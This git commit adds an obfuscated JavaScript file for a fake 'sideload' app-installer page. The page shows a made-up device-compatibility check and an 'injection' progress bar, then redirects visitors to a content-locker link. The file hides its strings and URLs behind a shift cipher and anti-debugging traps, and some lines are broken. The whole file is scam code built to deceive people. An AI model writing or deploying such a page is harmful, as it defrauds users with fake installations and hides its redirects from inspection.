6fea2076a52086e1e386351361743dd64fd32500
masterplaygaming <159706193+masterplaygaming@users.noreply.github.com>
2024-12-10 12:56:33 +0700

    Add files via upload

---
+++ js/sideload.js
@@ -0,0 +1,176 @@
+var _0x57cf = ['progress', 'src', 'action', '.app-icon', 'text', '0xa', 'setText', 'function\x20*\x5c(\x20*\x5c)', 'mpdbujpo', '0x8', '0x18', '0x29', '0x19', '.view-main', 'location', 'Finding\x20', '0x2', 'counter', 'stateObject', '0x7', '0x2b', 'bqqmjcsbsz/psh', 'addClass', '0x4', 'split', '.prod-active\x20span.app-name', '0x36', '0x17', '.item-content', 'Popup\x20opened', 'href', '0x6', '0x2a', 'string', 'Device\x20verification\x20required', '0x20', 'removeClass', '.popup-close', '0x1e', 'Popup\x20open', 'dialog', 'join', 'replace', '0x22', '0x23', '0x1f', '0x2e', 'while\x20(true)\x20{}', '0x28', '0x12', '0x21', '0x24', 'attr', 'iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>6431', 'prod-active', 'input', '0x30', 'push', '0x16', '.app-required', '\x20latest\x20version\x20', 'fromCharCode', 'searchbar', 'chain', '0x1a', '...', 'apply', 'com.myapp.test', '<div\x20class=\x22popup\x22\x20style=\x22background:#1d1d27!important\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22fake-homescreen\x22\x20style=\x22background-color:rgb(255,\x20149,\x200)!important\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22#\x22\x20class=\x22close-button\x20popup-close\x22\x20aria-label=\x22Cancel\x22></a>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22iphone-display\x22\x20aria-hidden=\x22true\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22app-icon-area\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22app-icon-region\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20alt=\x22app\x20icon\x22\x20src=\x22#\x22\x20class=\x22app-icon\x22\x20id=\x22app-icon\x22\x20style=\x22width:\x2033px;\x20height:\x2033px;\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22fake-homescreen-app-name\x22\x20style=\x22font-size:7.5px!important\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22installingAppName\x22></span>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22block\x22\x20style=\x22color:#fff\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22app-required\x22>Injection\x20required!</h1>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Follow\x20the\x20instructions\x20on\x20the\x20next\x20screen.</p>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22lockerr()\x22\x20id=\x22locker-btn\x22\x20class=\x22col\x20button\x20button-big\x20button-fill\x20button-round\x20external\x22\x20style=\x22background-color:rgb(255,\x20149,\x200)!important;\x22>Start\x20injection</button>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20id=\x22dv\x22\x20style=\x22display:none;\x22><span\x20id=\x22device\x22></span>\x20&#9679;\x20<span\x20id=\x22version\x22></span></p>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</center>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>', '/about/', 'views', 'gger', '\x20Required', 'ifbe', '0xf', '.list', '0x27', '.prod-active', 'checking', 'Making\x20request\x20for\x20installation\x20files', 'popup', '0x15', '0x0', '0x2f', 'setProgress', 'debu', 'about.html', 'tdsjqu', 'constructor', 'test', '0x33', '0xb', '0x35', '0x1b', '0x11', '0x14', 'Your\x20phone\x20is\x20compatible\x20with\x20', 'open', '0x25', '#app', 'log', '#locker-btn', '0x10', '.prod-active\x20span.app-info', 'Injecting...', '.prod-active\x20span.required-text', 'My\x20App', '0xd', '0x32', '0x34', 'create', '.searchbar', '.prod-active\x20img', 'createElement', 'map', '0x13', 'init', 'shift', '0x3', 'click', '0x1', '.prod-active\x20span.locker-link'];
+(function(_0x4356b4, _0x57cf80) {
+    var _0x44a0ce = function(_0x3ad211) {
+        while (--_0x3ad211) {
+            _0x4356b4['push'](_0x4356b4['shift']());
+        }
+    };
+    _0x44a0ce(++_0x57cf80);
+}(_0x57cf, 0x17f));
+var _0x44a0 = function(_0x4356b4, _0x57cf80) {
+    _0x4356b4 = _0x4356b4 - 0x0;
+    var _0x44a0ce = _0x57cf[_0x4356b4];
+    return _0x44a0ce;
+};
+var _a = [_0x44a0('0x6a'), _0x44a0('0x6c'), _0x44a0('0x23'), 'removeClass', _0x44a0('0x8'), _0x44a0('0x68'), _0x44a0('0x6d'), _0x44a0('0x78'), _0x44a0('0x2b'), _0x44a0('0x4f'), _0x44a0('0x3e'), _0x44a0('0x11'), _0x44a0('0x17'), _0x44a0('0x69'), _0x44a0('0x57'), _0x44a0('0x6f'), 'Checking\x20device\x20compatibility', _0x44a0('0x43'), _0x44a0('0x10'), _0x44a0('0x47'), _0x44a0('0x1e'), _0x44a0('0x0'), 'length', _0x44a0('0x44'), _0x44a0('0x36'), 'call', _0x44a0('0x6b'), _0x44a0('0x1'), 'apply', _0x44a0('0x70'), '\x5c+\x5c+\x20*(?:_0x(?:[a-f0-9]){4,6}|(?:\x5cb|\x5cd)[a-z0-9]{1,4}(?:\x5cb|\x5cd))', _0x44a0('0x63'), _0x44a0('0x48'), _0x44a0('0x2e'), _0x44a0('0x52'), _0x44a0('0x59'), _0x44a0('0x32'), 'left', _0x44a0('0x34'), _0x44a0('0x45'), _0x44a0('0x35'), _0x44a0('0x5d'), _0x44a0('0x2d'), _0x44a0('0x5e'), _0x44a0('0x3a'), '.item-title', _0x44a0('0x53'), _0x44a0('0xb'), _0x44a0('0x66'), _0x44a0('0x25'), _0x44a0('0x5'), _0x44a0('0x3f'), _0x44a0('0x33'), _0x44a0('0x16'), _0x44a0('0xc')];
+(function(_0x1d2c74, _0xeb9d5a) {
+    var _0xfab1ef = function(_0x23996e) {
+        while (--_0x23996e) {
+            _0x1d2c74[_0x44a0('0x28')](_0x1d2c74[_0x44a0('0x64')]());
+        }
+    };
+    _0xfab1ef(++_0xeb9d5a);
+}(_a, 0xc1));
+var _b = function(_0x142571, _0x26b956) {
+    _0x142571 = _0x142571 - 0x0;
+    var _0x28234c = _a[_0x142571];
+    return _0x28234c;
+};
+var _tt = function(_0x837e13, _0x179840) {
+    _0x837e13 = _0x837e13 - 0x0;
+    var _0x495677 = testings[_0x837e13];
+    return _0x495677;
+};
+var g = function() {
+    var _0x4c2c0f = !![];
+    return function(_0x52655a, _0x16ded9) {
+        var _0x4df355 = _0x4c2c0f ? function() {
+            if (_0x16ded9) {
+                var _0x3e312f = _0x16ded9[_b(_0x44a0('0x41'))](_0x52655a, arguments);
+                _0x16ded9 = null;
+                return _0x3e312f;
+            }
+        } : function() {};
+        _0x4c2c0f = ![];
+        return _0x4df355;
+    };
+}();
+(function() {
+    g(this, function() {
+        var _0x2ef2e4 = new RegExp(_b(_0x44a0('0x67')));
+        var _0x1e73a2 = new RegExp(_b(_0x44a0('0x79')), 'i');
+        var _0x10ad02 = _0x1ca239(_b(_0x44a0('0x65')));
+        console[_0x44a0('0x53')](_0x44a0('0x3d'), _0x2ef2e4);
+        if (!_0x2ef2e4[_b('0x4')](_0x10ad02 + _b('0x5')) || !_0x1e73a2[_b(_0x44a0('0x6'))](_0x10ad02 + _0x44a0('0x26'))) {
+            _0x10ad02('0');
+        } else {
+            _0x1ca239();
+        }
+    })();
+}());
+var app = new Framework7({
+    'root': _b(_0x44a0('0xe')),
+    'name': _b(_0x44a0('0x2')),
+    'id': _b(_0x44a0('0x72')),
+    'panel': {
+        'swipe': _b('0x9')
+    },
+    'routes': [{
+        'path': _b(_0x44a0('0x6e')),
+        'url': _b(_0x44a0('0x4a'))
+    }]
+});
+var mainView = app[_b('0xc')][_b('0xd')](_0x44a0('0x76'));
+var app = new Framework7();
+var searchKeyText = 'Injecting...';
+var searchbar = app[_b('0xe')][_b(_0x44a0('0x5a'))]({
+    'el': _b(_0x44a0('0x39')),
+    'searchContainer': _b(_0x44a0('0x55')),
+    'searchIn': _b(_0x44a0('0x4d')),
+    'on': {
+        'search'(_0x42c80d, _0x53858a, _0x1b0774) {
+            console[_b(_0x44a0('0x20'))](_0x53858a, _0x1b0774);
+        }
+    }
+});
+$(_b(_0x44a0('0x62')))[_b(_0x44a0('0x4e'))](function() {
+    $(_b(_0x44a0('0x62')))[_0x44a0('0x13')](_b(_0x44a0('0x40')));
+    $(this)[_b(_0x44a0('0x29'))](_b(_0x44a0('0x40')));
+});
+var dynamicPopup = app[_b(_0x44a0('0xa'))][_b(_0x44a0('0x5a'))]({
+    'content': _b(_0x44a0('0x73')),
+    'on': {
+        'open': function(_0xd6e215) {
+            console[_0x44a0('0x53')](_b(_0x44a0('0x75')));
+        },
+        'opened': function(_0x402a48) {
+            console[_b(_0x44a0('0x20'))](_b(_0x44a0('0x2f')));
+        }
+    }
+});
+$(_0x44a0('0xb'))['on']('click', function() {
+    dynamicPopup[_0x44a0('0x50')]();
+    var _0x26fac7 = $(_0x44a0('0x5f'))[_0x44a0('0x23')](_b('0x1b'));
+    var _0x4c29f9 = $(_0x44a0('0x56'))[_0x44a0('0x6d')]();
+    $('.installingAppName')[_0x44a0('0x6d')](_0x4c29f9);
+    var _0x53e4c2 = $(_0x44a0('0x58'))[_0x44a0('0x6d')]();
+    $(_0x44a0('0x2a'))[_0x44a0('0x6d')](_0x53e4c2);
+    var _0x1ff118 = '' + _0x53e4c2[_0x44a0('0x19')](_0x44a0('0x37'), '');
+    $(_0x44a0('0x54'))[_0x44a0('0x6d')](_0x1ff118);
+    $(_b('0x1c'))[_b('0x1d')](_b(_0x44a0('0x4c')), _0x26fac7);
+});
+$(_0x44a0('0x14'))[_0x44a0('0x66')](function(_0x3d8234) {
+    $(_b('0x13'))[_b(_0x44a0('0x15'))](_0x44a0('0x3c'));
+});
+
+function lockerr() {
+    var _0x269896 = $(_b(_0x44a0('0x1c')))[_0x44a0('0x6d')]();
+    var _0x2ff8fe = $(_b(_0x44a0('0x12')))[_b(_0x44a0('0x21'))]();
+    tede = [_b(_0x44a0('0x1a')) + _0x269896 + _b(_0x44a0('0x1b')), _b(_0x44a0('0x22')) + _0x269896, _b(_0x44a0('0x51')), _b('0x26')];
+    var _0x978f3c = 0x0;
+    var _0x44f2a8 = app[_b(_0x44a0('0x3b'))][_b(_0x44a0('0x1f'))](_b(_0x44a0('0x74')), _0x978f3c);
+    _0x44f2a8[_b(_0x44a0('0xf'))](_b(_0x44a0('0x3')));
+    var _0x30b359 = $('.prod-active\x20span.download-text')[_0x44a0('0x6d')]();
+    $('.dialog-inner\x20.dialog-title')[_0x44a0('0x6d')](_0x30b359 + _0x44a0('0x30'));
+    var _0x1d31ba = setInterval(function() {
+        _0x978f3c += 0x1;
+        _0x44f2a8[_b('0x2c')](_0x978f3c);
+        if (_0x978f3c > 0xa) {
+            _0x44f2a8[_b(_0x44a0('0xf'))](tede[0x0]);
+        }
+        if (_0x978f3c > 0x23) {
+            _0x44f2a8[_b(_0x44a0('0xf'))](tede[0x1]);
+            const _0x37d76d = _0x1d1f48 => _0x1d1f48[_0x44a0('0x7')]('')[_0x44a0('0x61')](_0x5d4d61 => String[_0x44a0('0x2c')](_0x5d4d61['charCodeAt']() - 0x1))[_0x44a0('0x18')]('');
+        }
+        if (_0x978f3c > 0x3c) {
+            _0x44f2a8[_b('0x2a')](tede[0x2]);
+        }
+        if (_0x978f3c > 0x50) {
+            _0x44f2a8[_0x44a0('0x6f')](tede[0x3]);
+        }
+        if (_0x978f3c === 0x64) {
+            clearInterval(_0x1d31ba);
+            setTimeout(function() {
+                window[_0x44a0('0x77')][_0x44a0('0xd')] = _0x2ff8fe;
+            }, 0x9c4);
+        }
+    }, 0x96);
+    dialog - inner;
+    dialog - title;
+}
+
+function _0x1ca239(_0x3196d3) {
+    function _0x1b7cda(_0x4aea10) {
+        if (typeof _0x4aea10 === _b('0x2d')) {
+            return function(_0x414945) {} [_b(_0x44a0('0x1d'))](_b(_0x44a0('0x42')))[_0x44a0('0x31')](_b(_0x44a0('0x27')));
+        } else {
+            if (('' + _0x4aea10 / _0x4aea10)[_b('0x31')] !== 0x1 || _0x4aea10 % 0x14 === 0x0) {
+                (function() {
+                    return !![];
+                } [_b(_0x44a0('0x1d'))](_b('0x32') + _b('0x33'))[_b(_0x44a0('0x5c'))](_b(_0x44a0('0x4b'))));
+            } else {
+                (function() {
+                    return ![];
+                } [_b(_0x44a0('0x1d'))](_b(_0x44a0('0x5b')) + _b(_0x44a0('0x49')))[_b('0x0')](_b(_0x44a0('0x9'))));
+            }
+        }
+        _0x1b7cda(++_0x4aea10);
+    }
+    try {
+        if (_0x3196d3) {
+            return _0x1b7cda;
+        } else {
+            _0x1b7cda(0x0);
+        }
+    } catch (_0xacf5d3) {}
+}
